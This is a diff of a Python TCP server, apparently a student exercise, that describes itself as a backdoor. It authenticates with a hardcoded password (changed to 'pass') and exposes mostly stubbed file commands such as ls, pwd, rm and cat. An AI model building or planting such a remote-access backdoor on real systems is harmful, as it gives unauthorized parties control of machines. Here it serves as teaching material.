@@ -16,7 +16,7 @@ import sys
 import subprocess                                                               # subprocess module will allow us to spawn new processes and connect to their
                                                                                 # pipes to collect their return results
 
-server_password = "thepasswordfornow"                                           # Hard coded server password
+server_password = "pass"                                           # Hard coded server password
 
 def printWorkingDir():
     procc = subprocess.Popen(["pwd"], stdout=subprocess.PIPE)
@@ -31,97 +31,97 @@ def listContents():
 
 # Override of handle method to handle functionality of the server
 class MyTCPHandler(socketserver.BaseRequestHandler):                            # Create a request handler as subclass of BaseRequestHandler
-   BUFFER_SIZE = 4096                                                           # Input buffer for client requests will be 4096 bytes
-   PASSWORD_SIZE = 1024
-   COMMAND_LIST = {
-   'pwd': 'pwd  - shows current working directory',
-   'cd': 'cd <dir> - change current working directory to <dir>',
-   'ls': 'list contents of the current working directory',
-   'cp': 'cp <file1> <file2> - copy file1 to file2',
-   'mv': 'mv <file1> <file2> - rename file1 to file2',
-   'rm': 'rm <file> - delete file',
-   'cat': 'cat <file> - return contents of the file',
-   'snap': 'snap - takes a snapshot of all the files in the current directory',
-   'diff': 'diff - compares the content of the current directory to the saved snapshot',
-   'help': 'help - list command options\nhelp <cmd> - show detailed help for given cmd',
-   'logout': 'logout - disconnect client',
-   'off': 'off - terminate the backdoor program',
-   'opt1': 'PLACEHOLDER',
-   'opt2': 'PLACEHOLDER',
-   }
-   def handle(self):                                                            # Override parent class handle method to handle incoming requests
-       # Authenticate user via hardcoded password
-       self.request.sendall( bytearray( "Enter Password: ", "utf-8"))
-       client_password = self.request.recv(self.PASSWORD_SIZE)
-       client_password = client_password.decode("utf-8")
-       client_password = client_password.strip()
-       if client_password == server_password:
-           self.request.sendall(bytearray( "Password correct. Welcome.\n", "utf-8"))
-           # Accept commands from authenticated user
-           while 1:
-               # Receive user command
-               self.request.sendall(bytearray("> ", "utf-8"))
-               data = self.request.recv(self.BUFFER_SIZE)                       # self.request is the TCP socket connected to the client and recv stores command from client into data
-               if len(data) == self.BUFFER_SIZE:                                # Client sent string of BUFFER_SIZE
-                   while 1:                                                     # Check to see if there is more data in the string
-                       try:  # error means no more data
-                           data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
-                       except:
-                           break
-               if len(data) == 0:
-                   break
-               data = (data.decode( "utf-8")).strip()                                     # Decode received byte array to interpret command
-               wordsInCommand = data.split()
-               # Process client command
-               if (wordsInCommand[0].lower() == "help"): #TODO add two more commands of our choosing to this list and implement
-                   if (len(wordsInCommand) == 1) or not(self.COMMAND_LIST.has_key(wordsInCommand[1].lower())):
-                       self.request.sendall( bytearray( "Supported commands:\n" + str(self.COMMAND_LIST.keys()).strip('[]').replace('\'','') + "\n", "utf-8"))
-                   else:
-                       self.request.sendall( bytearray(self.COMMAND_LIST[wordsInCommand[1].lower()] + "\n", "utf-8"))
-               elif data.lower() == "pwd" :
-                   result = printWorkingDir()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "cd" :
-                   result = printWorkingDir()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "cp" :
-                   result = printWorkingDir()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "ls" :
-                   result = listContents()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "mv" :
-                   result = listContents()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "rm" :
-                   result = listContents()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "cat" :
-                   result = listContents()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "snap" :
-                   result = listContents()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "diff" :
-                   result = listContents()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "logout" :
-                   result = listContents()
-                   self.request.sendall(bytearray(result, "utf-8"))
-               elif data.lower() == "off" :
-                   result = listContents()
-                   self.request.sendall(bytearray(result, "utf-8"))
+    BUFFER_SIZE = 4096                                                           # Input buffer for client requests will be 4096 bytes
+    PASSWORD_SIZE = 1024
+    COMMAND_LIST = {
+    'pwd': 'pwd  - shows current working directory',
+    'cd': 'cd <dir> - change current working directory to <dir>',
+    'ls': 'ls - list contents of the current working directory',
+    'cp': 'cp <file1> <file2> - copy file1 to file2',
+    'mv': 'mv <file1> <file2> - rename file1 to file2',
+    'rm': 'rm <file> - delete file',
+    'cat': 'cat <file> - return contents of the file',
+    'snap': 'snap - takes a snapshot of all the files in the current directory',
+    'diff': 'diff - compares the content of the current directory to the saved snapshot',
+    'help': 'help - list command options\nhelp <cmd> - show detailed help for given cmd',
+    'logout': 'logout - disconnect client',
+    'off': 'off - terminate the backdoor program',
+    'opt1': 'PLACEHOLDER',
+    'opt2': 'PLACEHOLDER',
+    }
+    def handle(self):                                                            # Override parent class handle method to handle incoming requests
+        # Authenticate user via hardcoded password
+        self.request.sendall( bytearray( "Enter Password: ", "utf-8"))
+        client_password = self.request.recv(self.PASSWORD_SIZE)
+        client_password = client_password.decode("utf-8")
+        client_password = client_password.strip()
+        if client_password == server_password:
+            self.request.sendall(bytearray( "Password correct. Welcome.\n", "utf-8"))
+            # Accept commands from authenticated user
+            while 1:
+                # Receive user command
+                self.request.sendall(bytearray("> ", "utf-8"))
+                data = self.request.recv(self.BUFFER_SIZE)                       # self.request is the TCP socket connected to the client and recv stores command from client into data
+                if len(data) == self.BUFFER_SIZE:                                # Client sent string of BUFFER_SIZE
+                    while 1:                                                     # Check to see if there is more data in the string
+                        try:  # error means no more data
+                            data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
+                        except:
+                            break
+                if len(data) == 0:
+                    break
+                data = (data.decode( "utf-8")).strip()                                     # Decode received byte array to interpret command
+                wordsInCommand = data.split()
+                # Process client command
+                if (wordsInCommand[0].lower() == "help"): #TODO add two more commands of our choosing to this list and implement
+                    if (len(wordsInCommand) == 1) or not(wordsInCommand[1].lower() in self.COMMAND_LIST):
+                        self.request.sendall( bytearray( "Supported commands:\n" + str(list(self.COMMAND_LIST)).strip('[]').replace('\'','') + "\n", "utf-8"))
+                    else:
+                        self.request.sendall( bytearray(self.COMMAND_LIST[wordsInCommand[1].lower()] + "\n", "utf-8"))
+                elif data.lower() == "pwd" :
+                    result = printWorkingDir()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "cd" :
+                    result = printWorkingDir()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "cp" :
+                    result = printWorkingDir()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "ls" :
+                    result = listContents()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "mv" :
+                    result = listContents()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "rm" :
+                    result = listContents()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "cat" :
+                    result = listContents()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "snap" :
+                    result = listContents()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "diff" :
+                    result = listContents()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "logout" :
+                    result = listContents()
+                    self.request.sendall(bytearray(result, "utf-8"))
+                elif data.lower() == "off" :
+                    result = listContents()
+                    self.request.sendall(bytearray(result, "utf-8"))
 
 
-               else:
-                   # TODO: deleted this echo of the command when other functionality is implemented
-                   self.request.sendall( bytearray( "You said: " + data + "\n I do not understand that command.\n", "utf-8"))
-                   print("%s (%s) wrote: %s" % (self.client_address[0],
+                else:
+                    # TODO: deleted this echo of the command when other functionality is implemented
+                    self.request.sendall( bytearray( "You said: " + data + "\n I do not understand that command.\n", "utf-8"))
+                    print("%s (%s) wrote: %s" % (self.client_address[0],
                         threading.currentThread().getName(), data.strip()))
-       else:
-           self.request.sendall( bytearray( "Incorrect Password. Goodbye.\n", "utf-8"))
+        else:
+            self.request.sendall( bytearray( "Incorrect Password. Goodbye.\n", "utf-8"))
 
 if __name__ == "__main__":
-   HOST, PORT = "localhost", int(sys.argv[1])                                   # Get port number from command line
-   server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)                  # Instantiate the threaded TCP server class and give it our handler
-   server.serve_forever()                                                       # Instruct server to handle many requests
+    HOST, PORT = "localhost", int(sys.argv[1])                                   # Get port number from command line
+    server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)                  # Instantiate the threaded TCP server class and give it our handler
+    server.serve_forever()                                                       # Instruct server to handle many requests
